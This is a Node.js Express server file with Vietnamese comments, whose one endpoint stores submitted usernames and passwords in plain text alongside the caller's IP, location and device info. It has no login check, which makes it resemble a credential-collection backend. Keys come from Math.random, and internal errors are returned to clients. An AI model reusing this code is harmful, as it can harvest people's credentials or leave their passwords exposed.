// server.js
// Gửi người anh em Lập trình:
// Lúc tui viết đống code này,
// chỉ có Chúa với tui là hiểu nó chạy kiểu gì.
// Giờ thì ... xin chia buồn,
// chỉ còn mỗi Chúa hiểu thôi.
//
// Nên nếu bro đang cố tối ưu
// cái mớ này và nó toang (99% Là vậy),
// thì làm ơn tăng cái biến đếm này Lên
// để người xui xẻo tiếp theo còn biết đường chạy:
//
// total_hours_wasted_here = 0 

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// 1. Cấu hình Middleware
app.use(express.json());
app.use(cors({
    origin: ['https://gemini-dot.github.io'],
    methods: ['GET', 'POST'],
    credentials: true
}));

// 2. Kết nối MongoDB
const mongoURI = process.env.MONGO_URI;

if (!mongoURI) {
    console.error("❌ MONGO_URI không được định nghĩa trong file .env!");
    process.exit(1);
}

mongoose.connect(mongoURI)
    .then(() => console.log("✅ Đã kết nối MongoDB thành công!"))
    .catch(err => {
        console.error("❌ Lỗi kết nối MongoDB:", err);
        process.exit(1);
    });

// Hàm tạo một chuỗi key ngẫu nhiên dài 16 ký tự
function generateKey() {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@$%^&*';
    let result = '';
    for (let i = 0; i < 16; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

// 3. Tạo khuôn mẫu dữ liệu (Schema)
const UserSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true },
    timestamp: { type: Date, default: Date.now },
    ipuser: { type: String },
    key: { type: String, unique: true },
    location: { type: String },
    device_info: { type: String }
});

const User = mongoose.model('User', UserSchema);

// 4. API lưu tài khoản
app.post('/api/save-account', async (req, res) => {
    try {
        // Lấy IP người dùng
        let userIP = req.headers['x-forwarded-for'] || 
                     req.headers['x-real-ip'] ||
                     req.socket.remoteAddress || 
                     req.ip;
        
        // Nếu IP là danh sách (ví dụ: 192.168.1.1, 10.0.0.1) thì chỉ lấy cái đầu tiên
        if (userIP && userIP.includes(',')) {
            userIP = userIP.split(',')[0].trim();
        }
        
        // Loại bỏ prefix ::ffff: nếu có (IPv6 mapped IPv4)
        if (userIP && userIP.startsWith('::ffff:')) {
            userIP = userIP.substring(7);
        }
        
        // Nếu vẫn không lấy được thì để mặc định
        if (!userIP) {
            userIP = "Không xác định";
        }

        const { username, password, location, device_info } = req.body;
        
        // Validate dữ liệu đầu vào
        if (!username || !password) {
            console.log("❌ Thiếu username hoặc password");
            return res.status(400).json({ 
                status: 'error', 
                message: 'Username và password là bắt buộc' 
            });
        }

        // Tạo key unique và lưu user
        let userKey;
        let saved = false;
        let attempts = 0;
        const maxAttempts = 5;

        while (!saved && attempts < maxAttempts) {
            try {
                userKey = generateKey();
                const newUser = new User({ 
                    username, 
                    password, 
                    ipuser: userIP, 
                    key: userKey, 
                    location: location || "Không xác định", 
                    device_info: device_info || "Không xác định"
                });
                
                await newUser.save();
                saved = true;
                console.log("💾 Đã lưu vào MongoDB:", username, "| IP:", userIP);
                
                res.status(200).json({ 
                    status: 'success', 
                    message: 'userok',
                    key: userKey 
                });
                
            } catch (err) {
                if (err.code === 11000) { // Duplicate key error
                    attempts++;
                    console.log(`⚠️ Key trùng lặp, thử lại lần ${attempts}...`);
                } else {
                    throw err; // Ném lỗi khác lên catch bên ngoài
                }
            }
        }

        if (!saved) {
            throw new Error('Không thể tạo key unique sau ' + maxAttempts + ' lần thử');
        }

    } catch (err) {
        console.error("❌ Lỗi khi lưu:", err);
        res.status(500).json({ 
            status: 'error', 
            message: 'badsever',
            error: err.message 
        });
    }
});

// 5. Health check endpoint
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'ok', 
        message: 'Server đang chạy',
        timestamp: new Date()
    });
});

// 6. Khởi động server
app.listen(PORT, () => {
    console.log(`🚀 Server online tại port: ${PORT}`);
    console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
});